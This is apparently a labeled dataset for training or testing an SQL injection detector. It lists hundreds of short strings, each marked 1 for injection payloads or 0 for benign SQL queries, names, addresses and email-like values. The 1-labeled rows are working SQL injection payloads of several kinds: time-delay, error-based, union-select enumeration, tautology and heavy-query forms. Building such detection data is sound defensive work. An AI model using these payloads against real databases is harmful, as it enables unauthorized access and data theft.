payload	label
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo	1
1'  )   and 2305  =  1934	1
SELECT say ( s )  FROM camera FULL OUTER JOIN	0
 SELECT * FROM promised ORDER BY there, bet	0
SELECT * FROM breath FETCH FIRST 50 PERCENT ROWS ONLY	0
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""qowc"" like ""qowc"	1
FROM  ( SELECT DISTINCT map FROM run ) 	0
SELECT COUNT ( comfortableID ) FROM tree	0
1 where 6095  =  6095 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
"-2373%""  )   or 9323  =  9323#"	1
SELECT simple ( s ) FROM court INNER JOIN	0
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr	1
-1558 or elt  (  3306  =  2272,2272  )  -- ioxt	1
-3349   )    )     )   union all select 6553,6553#	1
trombn	0
   SELECT jet, city+ ', ' + soil+ ' ' + growth+ ', ' + entire AS wrote  FROM play	0
ibero saborit	0
 UPDATE now SET kind = 'avoid'WHERE lot = 'his'	0
SELECT * FROM occasionally 3	0
castellanos de zapardiel	0
"-6928""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxhr"" like ""mxhr"	1
shanir	0
1  )   where 9645  =  9645 union all select null,null,null--	1
1'  )   waitfor delay '0:0:5'	1
59718568b	0
SELECT COUNT ( DISTINCT kept )  FROM canal	0
SELECT although FROM order UNION SELECT over FROM single ORDER BY third	0
meeks	0
-6279'  )   union all select 3026,3026,3026,3026,3026,3026,3026,3026--	1
c/ dos de mayo 89 13?b	0
"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt"	1
4890000000000000	0
1%'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '	1
50344	0
SELECT * FROM  ( SELECT special FROM duty ) 	0
"admin""  )   or   (  ""1""  =  ""1""--"	1
"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --"	1
SELECT * FROM although WHERE favorite = 'widely'  OR tone = 'country'	0
1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--	1
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 177 )  ORDER BY meta_id ASC	0
calle diseminado hornos de rey 29, 7?b	0
1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'mttj' like 'mttj	1
SELECT COUNT ( DISTINCT swam )  FROM produce	0
sayara	0
antone1@tiendasyofertas.ve	0
burbidge@elalamorestaurante.pr	0
INSERT INTO teeth ( blue, weak, coal, missing, easily, coal )  VALUES  ( 'water', 'like'. herd', 'pan', 'block', 'trip', 'forgotten' )  	0
gargajienta	0
ling-yu	0
   SELECT full,trail,oldest,to,zipper     (  (  suddenly JOIN worried ON mood.slipped =  themselves.problem )   INNER JOIN ourselvesON Orders.moment =  give.shorterID ) 	0
  SELECT * FROM enter WHERE actually IN  ( 'chance', 'teacher', 'beauty' )  	0
INSERT INTO whole  ( sudden, of, master )  VALUES  ( 'rule', 'largest', 'bread' )  	0
SELECT * FROM unhappy FETCH FIRST 50 PERCENT ROWS ONLY	0
borriol	0
SELECT hour ( s ) FROM cover INNER JOIN	0
 )   or pg_sleep  (  __TIME__  )  --	1
1'  )   where 3588  =  3588	1
   SELECT local, needed, ratherFROM law WHERE doctor  IS NOT NULL	0
bollullos de la mitacin	0
-2384%'   )    )    union all select 2467,2467,2467,2467#	1
9ot87ico	0
SELECT * FROM stand FETCH FIRST 50 PERCENT ROWS ONLY	0
1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'	1
SELECT * FROM soil WHERE part BETWEEN 'fight' AND 'said'	0
SELECT * FROM art	0
SELECT * FROM market FETCH FIRST 50 PERCENT ROWS ONLY	0
if  (  2823  =  3532  )   select 2823 else drop function kmqw--	1
"-1868""  )   where 9495  =  9495 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #"	1
"  SELECT SUBSTR ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;"	0
"1""   )    )    as tgwp where 9405  =  9405"	1
 SELECT * FROM directly ORDER BY river ASC, return DESC	0
8349640000000001	0
ensaa6o	0
SELECT AVG ( basis ) FROM broke SELECT SUM ( rule ) 	0
SELECT * FROM love FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM tired	0
44706	0
SELECT * FROM perfect	0
 or 1  =  1	1
 UPDATE duty SET pocket = 'closely'WHERE product = 'press'	0
1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +'	1
priaranza del bierzo	0
1'  )   order by 1#	1
select case when 3819  =  1887 then 1 else null end--	1
SELECT * FROM previous WHERE six = 'got' FETCH FIRST 3 ROWS ONLY	0
SELECT relationship ( s )  FROM production SELECT almost FROM wall	0
"1%""   )    )     )   and 7758  =  4792 and    (    (     (  ""%""  =  """	1
1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099	1
SELECT * FROM simple 3 SELECT * FROM outer	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11451 )  ORDER BY meta_id ASC	0
aaiun, 122 12?f	0
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl"	1
ondulada, 121	0
SELECT * FROM scale	0
champ	0
SELECT * FROM foot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM children	0
1'||  (  select 'yydv' from dual where 9639  =  9639	1
alegra-dulantzi	0
SELECT * FROM though ORDER BY worry	0
"1%""   )    )     )   union all select null,null,null,null,null,null#"	1
512155000000000	0
1   )    )    union all select null,null#	1
garantir	0
1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'	1
boca de hurgano	0
SELECT whispered ( s )  FROM care UNION ALL	0
1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
1'||  (  select 'glec' from dual where 4846  =  4846	1
"1""  )   where 7578  =  7578 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
  SELECT rule,cave FROM agree WHERE naturally = 'package' UNION SELECT specific, remain FROM paragraph	0
 select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1	1
SELECT * FROM planet FETCH FIRST 50 PERCENT ROWS ONLY	0
mehd3	0
SELECT without	0
"-3109"" or elt  (  1032  =  1032,3623  )  "	1
-8929' union all select 5324,5324,5324,5324,5324,5324--	1
adrie	0
DELETE FROM mile	0
eric3@familiamarino.sh	0
  SELECT MAKETIME ( 21,   59, 59 ) ;	0
SELECT COUNT ( go ) FROM throat	0
7670000000000000	0
hinkie@goovitae.pg	0
a65esad0	0
 select * from users where id  =  '1' union select +\#,@@VERSION -- 1'	1
1   )    )     )   union all select null,null,null,null,null--	1
1729	0
1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'	1
tenuta	0
1'  )   where 7478  =  7478	1
SELECT TOP 50 PERCENT * FROM chamber SELECT * FROM terrible FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM blow	0
"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --"	1
sarri de ter	0
SELECT COUNT ( DISTINCT letter )  FROM stock	0
SELECT * FROM each FETCH FIRST 3 ROWS ONLY	0
-2979'   )    )    as klou where 7092  =  7092 union all select 7092,7092--	1
   SELECT nearby, surrounded, snakeFROM development WHERE hand  IS NOT NULL	0
atolera	0
"1""  )   where 5870  =  5870 union all select null,null,null--"	1
  UPDATE group SET tongue =  'bus', City =  'directly' WHERE we =  seen	0
sobrecogimiento	0
"1""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --"	1
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1"	1
denni	0
nobuo	0
SELECT * FROM entire FETCH FIRST 50 PERCENT ROWS ONLY	0
1'   )    )    as wjfj where 3802  =  3802	1
calle conde de cartagena 97 5f	0
SELECT MIN ( food )  AS source FROM both	0
1'  )   as pxcd where 9754  =  9754 or sleep  (  5  )  --	1
SELECT Count ( * )  AS familiar	0
  SELECT joy,hunter,plastic FROM mission LEFT JOIN Orders ON child.finallyID =  corner.empty ORDER BY library.after	0
8249	0
SELECT * FROM shout FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM full	0
SELECT * FROM into WHERE feet = 'ice'  OR chosen = 'skin'	0
or ''  =  '	1
SELECT nose ( s )  FROM muscle SELECT musical ( s ) 	0
grgar8	0
glorieta valle de oro, 9 10a	0
SELECT * FROM entire WHERE Price NOT BETWEEN 10 AND 20	0
INSERT INTO naturally ( stretch, foreign, found, beside, experience, push )  VALUES  ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )  	0
1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr	1
1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#	1
r3nci8l5so	0
SELECT * FROM police WHERE frame = 'fifty'  AND  ( plain = 'noise' OR court = 'should' ) 	0
"-1475""  )   union all select 8611,8611,8611#"	1
" select * from users where id  =  1 or ""{%"" or 1  =  1 -- 1"	1
50619	0
divinizacin	0
47315	0
SELECT COUNT ( sent )  FROM closely	0
945491000000000	0
SELECT TOP 3 * FROM actual SELECT * FROM moving 3SELECT * FROM plate	0
{s	1
1'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
   SELECT small, church, memberFROM naturally WHERE up  IS NOT NULL	0
SELECT outer ( s )  FROM object SELECT waste ( s ) 	0
  SELECT deal,college FROM everybody WHERE active = 'mirror' UNION SELECT cloth, scared FROM indicate	0
SELECT COUNT ( tightly )  FROM eleven	0
41484237b	0
-1332  )   as qtbb where 7261  =  7261 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #	1
SELECT TOP 3 * FROM jungle WHERE plan = 'stiff' SELECT * FROM positive	0
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null#"	1
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #	1
"1"" or sleep  (  5  )  "	1
bujaraloz	0
marciniu	0
  SELECT porch AS avoid, let AS [hill]  FROM automobile	0
SELECT jump FROM mark UNION SELECT corner FROM coal ORDER BY over	0
SELECT COUNT ( examine ) FROM congress	0
96277205x	0
laureano	0
SELECT * FROM bell WHERE you = 'nodded'  OR use = 'gave'	0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4	1
SELECT MIN ( being )  AS pie FROM call	0
1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671	1
1'  )   where 8163  =  8163	1
SELECT * FROM riding FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM curious	0
"1""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --"	1
SELECT * FROM struck WHERE at = 'dance'	0
14724400f	0
laguna abusaid	0
SELECT TOP 3 * FROM practice	0
1%'   )    )     )   waitfor delay '0:0:5' and    (    (     (  '%'  =  '	1
SELECT * FROM alive WHERE Price NOT BETWEEN 10 AND 20	0
"1"" where 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"	1
SELECT * FROM yet WHERE slave = 'top'	0
"1""  )   where 3943  =  3943 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"	1
SELECT sport ( s )  FROM average SELECT usual FROM weigh	0
SELECT * FROM look FETCH FIRST 50 PERCENT ROWS ONLY	0
muenpasitiwet@magritte.gov	0
 SELECT * FROM having ORDER BY firm, dry	0
SELECT AVG ( desk )  FROM explore  SELECT SUM ( make ) 	0
1%'  )   and 2949  =  4847 and   (  '%'  =  '	1
SELECT AVG ( alone ) FROM sea	0
purpurania, 79 3?b	0
SELECT * FROM letter WHERE flight = 'underline'  AND  ( dance = 'basket' OR appearance = 'magnet' ) 	0
iif  (  5214  =  7412,1,1/0  )  	1
3580670000000000	0
SELECT AVG ( chance ) FROM happily SELECT SUM ( blanket ) 	0
de l' aliga 3,	0
   SELECT market, ever, control FROM slope WHERE material  IS NULL	0
 UPDATE diagram SET ranch = 'its'WHERE statement = 'try'	0
godall	0
"-9977"" where 5132  =  5132 union all select 5132--"	1
SELECT * FROM your WHERE lost  BETWEEN 10 AND 20	0
FROM  ( SELECT DISTINCT term FROM river ) 	0
select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #	1
"-4934"" union all select 5119,5119,5119,5119,5119--"	1
compte	0
INSERT INTO became  ( dark, complete, essential )  VALUES  ( 'freedom', 'wire', 'produce' )  	0
1'  )   union all select null#	1
8759	0
1'   )    )    as vdhw where 8858  =  8858 order by 1#	1
nickolau	0
1%'  )   and sleep  (  5  )   and   (  '%'  =  '	1
SELECT TOP 50 PERCENT * FROM same SELECT * FROM love FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wood	0
raab	0
1'  )   where 9544  =  9544 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --	1
"1""  )   where 2445  =  2445"	1
c/ gustavo adolfo becquer 91,	0
SELECT * FROM hello WHERE first NOT BETWEEN 'sleep' AND 'breathing'	0
SELECT MIN ( right )  AS wool FROM if	0
"1"" where 4597  =  4597 rlike sleep  (  5  )  --"	1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #	1
paz	0
sirola@professionalhost.cc	0
"1%""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""%""  =  """	1
solosancho	0
 SELECT column_name ( s )  FROM our,swept	0
SELECT AVG ( buried ) FROM golden SELECT SUM ( flies ) 	0
"1%""  )   union all select null,null,null,null,null,null,null,null,null#"	1
"1""   )    )    as dooq where 7911  =  7911"	1
SELECT TOP 3 * FROM heading WHERE character = 'prepare' SELECT * FROM warm	0
SELECT TOP 50 PERCENT * FROM distance SELECT * FROM effort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM measure	0
"1%""  )   or sleep  (  5  )   and   (  ""%""  =  """	1
SELECT * FROM actually	0
SELECT * FROM nothing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM club	0
sonoe	0
1' order by 1--	1
1'  )   and elt  (  3528  =  3566,3566  )  	1
SELECT * FROM system  WHERE satisfied NOT LIKE '[enter]%'	0
1   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
 UPDATE adult SET honor = 'gain'WHERE chicken = 'paragraph'	0
select   (  case when   (  2350  =  8682  )   then 2350 else 1/  (  select 0  )   end  )  --	1
"1""   )    )     )   union all select null,null#"	1
enang.ostar	0
"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --"	1
SELECT * FROM compound WHERE smaller = 'consider'  AND City = 'mill'	0
3074020000000000	0
SELECT * FROM major WHERE us NOT LIKE '[or]%'	0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '	1
4611890000000000	0
   SELECT ought, first+ ', ' + hair+ ' ' + pleasure+ ', ' + himself AS outer  FROM church	0
1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --	1
 UPDATE sleep SET bigger = 'building'WHERE mix = 'shown'	0
1'+  (  select thmg where 2546  =  2546 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
godofredo	0
-9505'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qhdg'  =  'qhdg	1
SELECT floor ( s )  FROM sugar	0
SELECT * FROM tired WHERE tank = 'including' LIMIT 3	0
"-1830""   )    )    as bptv where 4805  =  4805 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --"	1
"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
SELECT * FROM needs WHERE into BETWEEN printed09/01/1996prize AND exclaimed15/31/1996scale	0
  SELECT guardID AS ID, statement AS ride FROM upward	0
   SELECT sent,join,enjoy,putting,vast     (  (  average JOIN extra ON visit.good =  dust.higher )   INNER JOIN shownON Orders.till =  example.steadyID ) 	0
SELECT * FROM afraid WHERE rays = 'roar'	0
""";waitfor delay '0:0:__TIME__'--"	1
SELECT * FROM farmer WHERE replace = 'split' FETCH FIRST 3 ROWS ONLY	0
1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'tzrd'  =  'tzrd	1
1'  )   as xskm where 3525  =  3525 and 2435  =  6513	1
  SELECT Orders.towerrID, Employees.them, Employees.its FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.exactlyID ORDER BY Orders.valleyID	0
 SELECT column_name ( s )  FROM ship,fun	0
SELECT AVG ( know ) FROM toward	0
1'+  (  select ksoh where 6339  =  6339	1
-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--	1
DELETE FROM rays WHERE plates = 'branch'	0
 union   (  select NULL, NULL,   (  select @@version   )    )    --	1
"-5826""   )    )    union all select 7192,7192#"	1
SELECT MIN ( twelve )  AS printed FROM automobile	0
"SELECT * FROM until WHERE been BETWEEN ""private"" AND    ""piece"""	0
SELECT * FROM ground WHERE origin NOT LIKE '[exciting]%'	0
SELECT TOP 50 PERCENT * FROM discovery SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM kids	0
   SELECT rubber, difficulty, teethFROM dried WHERE magic  IS NOT NULL	0
equiparable	0
  SELECT surprise AS dear, rest AS [yard]  FROM especially	0
1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--	1
23215	0
"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol"	1
1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  	1
rei1@rtce.au	0
1'||  (  select 'xyft' from dual where 8250  =  8250 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'	1
1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn	1
"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""htyi""  =  ""htyi"	1
1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'gwew' like 'gwew	1
SELECT * FROM frozen WHERE grain = 'car'  AND  ( joined = 'wherever' OR month = 'sight' ) 	0
SELECT * FROM fill WHERE want = 'fellow'  OR mad = 'making'	0
1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT * FROM this 3	0
"-6848""   )    )    or 4071  =  5312"	1
-1171' union all select 3958,3958,3958,3958,3958--	1
"1%""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --"	1
1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288	1
1%'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '	1
iif  (  7036  =  2370,1,1/0  )  	1
montesano_wontner@pcvirus.tm	0
woolgar@awat.gov	0
manguita	0
"waitfor delay '0:0:5' and   (  ""%""  =  """	1
"1""   )    )    and 9800  =  8713"	1
duplan	0
SELECT rose ( s FROM glass RIGHT JOIN	0
SELECT * FROM dark WHERE physical BETWEEN '1996-07-01' AND '1996-07-31'	0
7576	0
"  SELECT TO_DAYS ( ""2017-06-20"" ) ;"	0
DELETE FROM world	0
SELECT COUNT ( cloud ) FROM already	0
bijman3	0
SELECT * FROM salt WHERE NOT stage = 'examine'  AND NOT day = 'alphabet'	0
SELECT * FROM compare WHERE journey = 'improve'  AND City = 'trick'	0
carretera rubi 106	0
SELECT AVG ( blow ) FROM pole	0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'quqx'  =  'quqx	1
SELECT * FROM invented WHERE remember BETWEEN 'nearer' AND 'rose'	0
1'  )   as pwqs where 2291  =  2291	1
SELECT * FROM oil WHERE modern = 'quiet'  OR mirror = 'him'	0
aulakh	0
  SELECT * FROM boat WHERE equipment NOT IN  ( 'calm', 'blue', 'except' )  	0
SELECT TOP 3 * FROM own WHERE individual = 'worse' SELECT * FROM from	0
SELECT * FROM group WHERE figure = 'vapor' LIMIT 3	0
1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm	1
SELECT * FROM am WHERE pale NOT BETWEEN 'history' AND 'trouble'	0
SELECT * FROM lungs WHERE advice = 'egg' LIMIT 3	0
spano-macary@biosaludsystems.ml	0
08enmand15a	0
2969	0
lucas fiallega	0
SELECT * FROM young WHERE highest = 'folks' FETCH FIRST 3 ROWS ONLY	0
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A	1
  SELECT difficultyID AS ID, save AS even FROM highest	0
SELECT DISTINCT hollow FROM ordinary	0
"SELECT DAYOFWEEK ( ""2017-06-15 09:34:21"" ) ;"	0
SELECT * FROM add WHERE wealth BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT * FROM represent WHERE exactly NOT LIKE 'toy%'	0
SELECT * FROM sum  WHERE lose = problem	0
select   (  case when   (  1812  =  2446  )   then 1812 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
SELECT AVG ( travel ) FROM bus SELECT SUM ( strike ) 	0
llobet garrido	0
SELECT include ( s )  FROM egg FULL OUTER JOIN	0
rubau	0
revesa	0
SELECT COUNT ( social ) FROM young	0
SELECT * FROM child WHERE    NOT blow = 'flight'	0
SELECT function ( s )  FROM whispered FULL OUTER JOIN	0
"""&"""	1
08686877f	0
"-7868""   )    )    or 9323  =  9323#"	1
SELECT COUNT ( escape ) FROM offer	0
SELECT * FROM scared WHERE push BETWEEN '1996-07-01' AND '1996-07-31'	0
 SELECT column_name ( s )  FROM difference,damage	0
valverde de valdelacasa	0
SELECT review FROM told UNION SELECT sand FROM studying ORDER BY single	0
or '7659'  =  '7659	1
SELECT * FROM cage WHERE carbon LIKE '%pen%'	0
SELECT indeed ( s )  FROM rise LEFT JOIN	0
3192910000000000	0
SELECT relationship ( s )  FROM production FULL OUTER JOIN	0
1'  )   where 1600  =  1600 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'yhpp' like 'yhpp	1
SELECT * FROM practice  WHERE pipe = certainly	0
65340567m	0
6196	0
SELECT MIN ( interest )  AS flat FROM planet	0
SELECT * FROM molecular WHERE    NOT put = 'nest'	0
SELECT TOP 50 PERCENT * FROM shut SELECT * FROM general FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM three	0
SELECT sheet ( s ) FROM loss INNER JOIN	0
SELECT TOP 3 * FROM discuss WHERE enjoy = 'needle' SELECT * FROM still	0
SELECT * FROM dog WHERE gulf BETWEEN '1996-07-01' AND '1996-07-31'	0
-3677'   )    )    or 1939  =  4484	1
brazzel1@castigadas.am	0
